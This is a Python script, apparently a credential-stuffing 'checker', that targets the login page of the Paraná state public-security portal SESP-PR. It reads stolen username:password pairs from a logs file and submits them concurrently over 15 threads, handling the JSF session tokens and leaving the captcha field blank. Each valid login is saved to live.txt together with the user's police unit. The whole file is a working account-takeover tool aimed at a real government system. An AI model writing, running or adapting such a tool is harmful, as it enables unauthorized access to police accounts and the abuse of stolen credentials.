import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
import time
import os

init(autoreset=True)

# Configurações
MAX_THREADS = 15
TIMEOUT = 10
LOGINS_FILE = 'logs.txt'
LIVE_FILE = 'live.txt'
DIE_FILE = 'die.txt'
BASE_URL = 'https://www.sespintegracao.pr.gov.br/sespintegracao'
LOGIN_URL = f'{BASE_URL}/login.jsf'

# Contadores
stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': time.time()
}

# Painel de status
def show_panel():
    elapsed = time.time() - stats['start_time']
    print("\033[H\033[J")  # Limpa o terminal
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.YELLOW + "    SESP PR CHECKER - CALUSH")
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.GREEN + f" ✅ LIVE: {stats['live']}")
    print(Fore.RED + f" ❌ DIE: {stats['die']}")
    print(Fore.YELLOW + f" ⚠ ERROR: {stats['error']}")
    print(Fore.CYAN + f" ⏳ TEMPO: {elapsed:.2f}s")
    print(Fore.CYAN + "══════════════════════════════════")

def save_result(filename, content):
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(content + '\n')
    except Exception as e:
        print(Fore.RED + f"Erro ao salvar resultado: {e}")

def get_session_data(session):
    try:
        response = session.get(LOGIN_URL, timeout=TIMEOUT)
        soup = BeautifulSoup(response.text, 'html.parser')
        viewstate = soup.find('input', {'name': 'javax.faces.ViewState'})['value']
        window_id = soup.find('input', {'name': 'windowId'})['value']
        return viewstate, window_id
    except Exception as e:
        raise Exception(f"Erro ao obter dados da sessão: {e}")

def check_login(username, password):
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'Origin': BASE_URL,
        'Content-Type': 'application/x-www-form-urlencoded'
    })

    try:
        viewstate, window_id = get_session_data(session)
        login_data = {
            'form_login': 'form_login',
            'javax.faces.ViewState': viewstate,
            'form_login:usuario': username,
            'form_login:j_idt19': password,
            'form_login:kaptchaResponse': '',
            'form_login:j_idt25': 'Entrar',
            'windowId': window_id
        }

        response = session.post(LOGIN_URL, data=login_data, timeout=TIMEOUT)
        soup = BeautifulSoup(response.text, 'html.parser')
        unidade_div = soup.find('div', {'id': 'unidade'})

        if unidade_div:
            unidade_text = unidade_div.text.strip()
            stats['live'] += 1
            save_result(LIVE_FILE, f"{username}:{password} | Unidade: {unidade_text}")
            return f"{Fore.GREEN}[+] LIVE | {username}:{password} | {unidade_text}"
        else:
            stats['die'] += 1
            save_result(DIE_FILE, f"{username}:{password}")
            return f"{Fore.RED}[-] DIE | {username}:{password}"

    except Exception as e:
        stats['error'] += 1
        save_result(DIE_FILE, f"{username}:{password} | Erro: {str(e)[:100]}")
        return f"{Fore.YELLOW}[!] ERROR | {username}:{password} | {str(e)[:50]}"

def main():
    if not os.path.exists(LOGINS_FILE):
        print(Fore.RED + f"[!] Arquivo {LOGINS_FILE} não encontrado!")
        return

    try:
        with open(LOGINS_FILE, 'r', encoding='utf-8') as f:
            accounts = [line.strip().split(':', 1) for line in f if ':' in line]
    except Exception as e:
        print(Fore.RED + f"[!] Erro ao ler arquivo: {e}")
        return

    stats['total'] = len(accounts)
    show_panel()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for acc in accounts:
            username, password = acc[0], acc[1]
            futures.append(executor.submit(check_login, username, password))

        for future in as_completed(futures):
            print(future.result())
            show_panel()

    print(Fore.GREEN + "\n[+] Verificação concluída!")

if __name__ == "__main__":
    main()